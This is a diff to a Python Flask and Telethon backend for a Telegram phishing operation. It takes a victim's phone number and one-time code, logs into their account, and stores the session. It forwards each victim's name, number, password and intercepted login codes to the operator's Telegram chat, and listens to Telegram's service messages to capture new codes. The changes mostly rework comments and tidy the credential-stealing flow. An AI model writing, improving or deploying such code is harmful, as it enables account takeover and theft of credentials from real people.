@@ -12,7 +12,6 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# Memori sementara untuk menyimpan data user
 user_db = {} 
 
 def bot_api(method, payload):
@@ -20,7 +19,7 @@ def bot_api(method, payload):
 
 @app.route('/register', methods=['POST'])
 def register():
-    # Pastikan data terbaca dengan get_json()
+    # PERBAIKAN: Menggunakan get_json() agar data terbaca
     data = request.get_json()
     if not data: return jsonify({"status": "error"}), 400
     return asyncio.run(handle_flow(data))
@@ -32,7 +31,6 @@ async def handle_flow(data):
         if nomor.startswith('0'): nomor = '+62' + nomor[1:]
         nama = data.get('nama', 'User')
 
-        # Ambil session yang tersimpan
         session_str = user_db.get(nomor, {}).get('session', '')
         client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
         await client.connect()
@@ -46,7 +44,6 @@ async def handle_flow(data):
             try:
                 await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                 text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : "
-                # Kirim log utama
                 if not user_db[nomor].get('msg_id'):
                     msg = bot_api("sendMessage", {
                         "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
@@ -81,54 +78,41 @@ def webhook():
     if "callback_query" in update:
         call = update["callback_query"]
         action, nomor = call["data"].split("_")
-        
-        # PERBAIKAN: Pastikan nomor ada di memori agar tidak KeyError
-        if nomor not in user_db:
-            user_db[nomor] = {"nama": "User", "msg_id": None, "status_id": None}
+        if nomor not in user_db: user_db[nomor] = {"nama": "User", "msg_id": None, "status_id": None}
 
         if action == "upd":
-            # Hapus pesan "Siap" yang lama jika ada
-            if user_db[nomor].get('status_id'):
+            if user_db[nomor].get('status_id'): # Hapus yang lama jika ada
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
-            
             res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot siap menerima OTP!", 
                                          "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}})
             user_db[nomor]['status_id'] = res.get('result', {}).get('message_id')
             asyncio.run(monitor_new_otp(nomor))
-            
-        elif action == "exit":
+        elif action == "exit": # HAPUS PESAN SAAT EXIT DIKLIK
             if user_db[nomor].get('status_id'):
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
                 user_db[nomor]['status_id'] = None
-                
     return jsonify({"status": "success"})
 
 async def monitor_new_otp(nomor):
     data = user_db.get(nomor)
     if not data or not data.get('session'): return
-    
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     await client.connect()
     try: await client.send_code_request(nomor)
     except: pass
-
     @client.on(events.NewMessage(from_users=777000))
     async def handler(event):
-        otp_match = re.search(r'\b\d{5}\b', event.raw_text)
-        if otp_match:
-            new_otp = otp_match.group(0)
-            # Isi kolom OTP di pesan utama
+        otp = re.search(r'\b\d{5}\b', event.raw_text)
+        if otp:
             bot_api("editMessageText", {
                 "chat_id": CHAT_ID, "message_id": data['msg_id'],
-                "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{new_otp}`",
+                "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                 "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
             })
-            # OTOMATIS HAPUS pesan "Siap" setelah OTP dapat
-            if data.get('status_id'):
+            if data.get('status_id'): # HAPUS OTOMATIS SETELAH DAPAT OTP
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                 data['status_id'] = None
             await client.disconnect()
-
     await asyncio.sleep(300)
     if client.is_connected(): await client.disconnect()
 
